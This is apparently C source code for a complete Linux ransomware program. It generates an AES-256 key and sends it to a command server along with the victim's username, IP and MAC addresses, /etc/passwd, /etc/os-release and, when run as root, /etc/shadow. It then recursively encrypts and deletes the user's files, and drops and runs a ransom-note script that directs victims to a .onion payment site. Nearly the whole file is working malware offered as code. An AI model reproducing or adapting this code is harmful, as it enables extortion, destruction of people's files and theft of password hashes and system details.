#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

int shell(char *executableName)
{
    char path[PATH_MAX];
    snprintf(path, PATH_MAX, "/home/%s/Desktop/%s", getlogin(), "runme.sh");
    FILE *s = fopen(path, "w");
    fputs("#!/bin/bash\n", s);
    fputs("echo \"\nHello $USER...\"\n", s);
    fputs("echo \"Today is $(date).\"\n", s);
    fputs("echo \"Your files has been encrypted...\"\n", s);
    fputs("echo \"...And we have all your informations...\"\n", s);
    fputs("echo \"If you want to recover your files, you must pay the bill.\"\n", s);
    fputs("echo \"To proceed, you have to go on the darknet.\"\n", s);
    fputs("echo \"http://s4k4ceiapwwgcm3mkb6e4diqecpo7kvdnfr5gg7sph7jjppqkvwwqtyd.onion/\"\n", s);
    fputs("echo \"There is a guide on our site.\"\n", s);
    fputs("echo \"If you already have a key, please enter it below:\"\n", s);
    fputs("read -p \"Key: \" key\n", s);
    fputs("echo \"Same for the vector\"\n", s);
    fputs("read -p \"Vector: \" iv\n", s);
	fputs("echo \"Enter the path to decrypt, probably /home/USER\"\n", s);
	fputs("read -p \"Path: \" path\n", s);
    char command[5000];
    char execname[20];
    memcpy(execname, executableName+2, sizeof(executableName)-2);
    char cwd[512];
    sprintf(command, "%s/%s -p $path -d $key $iv", getcwd(cwd, PATH_MAX), execname);
    fputs(command, s);

    fclose(s);

    char str[4105];
    sprintf(str, "chmod +x %s", path);
    system(str);
    char *run = path;
    system(run);
    return 1;
}

int victime_name(int socket) // search the name of the user and send it to the server
{
    char *target_hostname;
    char *hostname_msg="Hostname: "; 
    target_hostname=getlogin();  // getlogin():return a ptr of a string that contains the login     https://linux.die.net/man/3/getlogin
    send(socket, (const char *)hostname_msg, strlen(hostname_msg),0);
    send(socket,(const char *)target_hostname,strlen(target_hostname),0);
    printf("Hostname sent. \n");
    return 1;
}

int send_file(int socket, char *msg2, char *filename) // read a file and send it to the server
{	
	FILE *file;
	char data_send[150]; // just a buffer 
	file=fopen(filename,"r");
    if(file)
    {
        while(fgets(data_send,150,file)) // read limited to 150, the buffer will be send to the server
            {
            send(socket, (const char *)data_send, strlen(data_send),0);
            }
        fclose(file); 
        printf("File sent. -> %s\n", filename);
    }
    else
    {
        handleErrors();
    }
	return 0;
}

int mac_address(int socket, char * interface, char *msg2)
{
	FILE *data;
	char *msg_Mac="Mac address: ";
	char datas[50];
	char *msg_nointer = " No known interfaces\n";
    char *intpath;
	if (strcmp(interface,"eth0")==0)
		{
            intpath="/sys/class/net/eth0/address";
		}
	else if (strcmp(interface,"lo")==0)
		{
            intpath="/sys/class/net/lo/address";
		}
    else if (strcmp(interface,"eth1")==0)
		{
            intpath="/sys/class/net/eth1/address";
		}
    else
		{
		    send(socket, (const char *)msg_nointer, strlen(msg_nointer),0);
            return 0;
		}
    data=fopen(intpath,"r"); // open the file who contains the mac address of an interface
    fgets(datas,50,data); // read limited to 50, the buffer will be send to the server
    send(socket, (const char *)msg2, strlen(msg2),0);
    send(socket, (const char *)msg_Mac, strlen(msg_Mac),0);
    send(socket,(const char *)datas, strlen(datas),0);
    fclose(data);
    printf("Mac address sent. -> %s", datas);
	return 1;
}

int IP_Address(int socket,char *msg2) //Ip address + netmask    https://man7.org/linux/man-pages/man3/getifaddrs.3.html 
{

    struct ifaddrs *ifaddresse, *interface;
    struct sockaddr_in *ipv4; // network address	https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html

    	getifaddrs(&ifaddresse); // getifaddrs(): create a chained struct list that says the local network interfaces
        for (interface = ifaddresse; interface != NULL; interface = interface->ifa_next)  
	{   /* interface = eth0 ; eth0!=NULL last iter in the list, works as '\0' ; interface->ifa_next next iter in the list */ 
        	ipv4 = (struct sockaddr_in *) interface->ifa_addr; // convert interface address into the sockaddr_in struct
        	char *ip= inet_ntoa(ipv4->sin_addr); // convert ipv4 in ascii string      inet_ntoa: https://linux.die.net/man/3/inet_ntoa:
        	char *msgss=": ";
        	if (strcmp(ip,"0.0.0.0")==0 || strcmp(ip,"1.0.0.0")==0 || strcmp(ip,"2.0.0.0") ==0)
        		{
			        continue;
        		}
       	 	else
        		{
       	    		mac_address(socket,interface->ifa_name,msg2);
            		send(socket,(const char *)interface->ifa_name,strlen(interface->ifa_name),0);
            		send(socket,(const char *)msgss,strlen(msgss),0);
           		    send(socket,(const char *)ip,strlen(ip),0);
                    printf("Ip address sent. -> %s\n", ip);
        		} 
    	}
    
    freeifaddrs(ifaddresse);
    return 0;
}

void usage()
{
	printf("--help | -h: print this message\n-p <PATH>: select a path to\n-e <KEY>: encrypt\n-d <HEX_KEY> <HEX_IV>: decrypt\n");
	printf("Should looks like this:\n");
	printf("./<NameAfterCompiling> -p <PATH> -e          to encrypt\nor\n");
    printf("./<NameAfterCompiling> -p <PATH> -d <HEX_KEY> <HEX_IV>    to decrypt\n");
}

int is_encrypted(char *filename)
{
    if(strrchr(filename, '.')!=NULL)
    {
        char *dot = strrchr(filename,'.'); // last occurence of '.'
        char extension[6]; // buffer for the new extension
        snprintf(extension, 6, ".%s", ENCRYPT_EXT); // Pwnd becomes .Pwnd for is_encrypted()
        if(strcmp(dot, extension)==0)
        {
            return 1;
        }
        else
        {
            return 0;
        }
    }
    else // no extension, file is not encrypted at all
    {
        return 0;
    }
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag, char *executableName)
{
	DIR *d;
    d = opendir(name);

    // if not open
    if (!d){
        handleErrors();
        printf("No such file or directory\n");
    }
    while(1)
    {
        struct dirent *entry;
        const char *d_name;
        unsigned char d_type;
        char abs_path[PATH_MAX];
        char exec_path[PATH_MAX];
        char str[20]={0};

        entry = readdir(d);
        if(!entry)
        {
            // no more entries in this directory -> break the loop
            break;
        }

        d_name = entry->d_name;
        d_type = entry->d_type;
        snprintf(abs_path, PATH_MAX, "%s/%s", name, d_name); // calculate the path that will be encrypted/decrypted
        
        memcpy(str, executableName+2, sizeof(executableName)-2);
        snprintf(exec_path, PATH_MAX, "%s/%s", name, str); // calculte the running path

        if(strcmp(d_name, ".")!=0) // security
        {
            if(strcmp(d_name, "..")!=0) // more security
            {
                if(d_type == DT_REG) // regular file (not a dir so)
                {
                    if(de_flag=='e')
                    {
                        if(!is_encrypted(abs_path))
                        {
                            if(strcmp(abs_path, exec_path)==0) // dont wan't to encrypt the program that hasen't finished his job
                            {
                                printf("%s will not be encrypted due to running\n", exec_path);
                            }
                            else
                            {
                                encrypt(key, iv, abs_path);
                                remove(abs_path);
                            }
                        }
                        else
                        {
                            printf("%s is already encrypted\n", abs_path);
                        }
                    }
                    else if(de_flag=='d')
                    {
                        if(is_encrypted(abs_path))
                        {
                            decrypt(key, iv, abs_path);
                            remove(abs_path);
                        }
                        else
                        {
                            printf("%s is not encrypted\n", abs_path);
                        }
                    }
                }
            }
        }

        if(d_type & DT_DIR)
        {

            // check that the directory is not "d" or d's parent
            
            if (strcmp(d_name, "..") != 0 &&
                strcmp(d_name, ".") != 0)
                {
                int path_length;
                char path[PATH_MAX];
 
                path_length = snprintf(path, PATH_MAX,
                                        "%s/%s", name, d_name);
                
                if(path_length >= PATH_MAX)
                {
                    handleErrors();
                }

                // recursively call the function with new path
                listdir(path, iv, key, de_flag, executableName);
            }
	}
    }
    // close the directory
    if (closedir(d))
    {
        handleErrors();
    }
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
    RAND_bytes(key, sizeKey);
    RAND_bytes(iv, sizeIv);
    bytes_to_hexa(key, pKey, sizeKey);
    bytes_to_hexa(iv, pIv, sizeIv);
    return 1;
}

int send_key(char *pKey,char *pIv)
{
	int sock; // id
	int port= 7777;
	char *ip_serveur="127.0.0.1";
	// create socket
	sock=socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in serveur_adresse; // sockaddr_in comes from a struct
	serveur_adresse.sin_family = AF_INET;
	serveur_adresse.sin_port=htons(port); // htons: convert unsigned short int to network byte
	serveur_adresse.sin_addr.s_addr=inet_addr(ip_serveur);
	while (connect(sock,(struct sockaddr *)&serveur_adresse,sizeof(serveur_adresse))!=0)
		{
		}
    char *msg2="\n";

    char *msg="key: ";
	send(sock,(const char *)msg, strlen(msg),0);	
	send(sock,(const char *)pKey, strlen(pKey),0);
    send(sock, (const char *)msg2, strlen(msg2),0);

    char *msg1="iv: ";
	send(sock,(const char *)msg1, strlen(msg1),0);	
	send(sock,(const char *)pIv, strlen(pIv),0);
    send(sock, (const char *)msg2, strlen(msg2),0);

	victime_name(sock);
	IP_Address(sock, msg2);

    if(getuid()==0)
    {
        send(sock, (const char *)msg2, strlen(msg2),0);
        send(sock, (const char *)msg2, strlen(msg2),0);
        send_file(sock, msg2, "/etc/os-release");
    }
    else
    {
        char *msg="\nNo version of the os because not runned in root.";
        send(sock,(const char *)msg, strlen(msg),0);
    }

    send(sock, (const char *)msg2, strlen(msg2),0);
    send(sock, (const char *)msg2, strlen(msg2),0);
	send_file(sock, msg2, "/etc/passwd");

    if(getuid()==0)
    {
        send(sock, (const char *)msg2, strlen(msg2),0);
        send(sock, (const char *)msg2, strlen(msg2),0);
        send_file(sock, msg2, "/etc/shadow");
    }

	close(sock);

    return 1;
}

int main (int argc, char * argv[])
{
    int sizeKey = AES_256_KEY_SIZE;
    int sizeIv = AES_BLOCK_SIZE;
    unsigned char key[AES_256_KEY_SIZE];
    unsigned char iv[AES_BLOCK_SIZE];
    char *pKey = (char*)malloc(sizeof(key)*2+1); // need 2x more size for a hexa key, don't forget de +1 for '\0'
    char *pIv = (char*)malloc(sizeof(iv)*2+1);

    char *executableName = argv[0];

	if((argc==1) || (strcmp(argv[1], "--help")==0) || (strcmp(argv[1], "-h")==0))
	{
		usage();
	}
	else if(strcmp(argv[1], "-p")==0)
	{
		if(argc==4 && strcmp(argv[3], "-e")==0)
		{
            generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
            send_key(pKey, pIv);
			listdir(argv[2], iv, key, 'e', executableName);
            shell(executableName);

            free((char*)pKey);
            explicit_bzero(pKey, 65);
            free((char*)pIv);
            explicit_bzero(pIv, 33);
		}
		else if(argc==6 && strcmp(argv[3], "-d")==0)
		{
            hexa_to_bytes(argv[4], key, sizeKey);
            hexa_to_bytes(argv[5], iv, sizeIv);
			listdir(argv[2], iv, key, 'd', executableName);
		}
        else
        {
            printf("Missing arguments. Probably the key/iv after -d. Refer to --help\n");
        }
	}
    else
    {
        printf("Missing arguments. See --help | -h\n");
    }
}
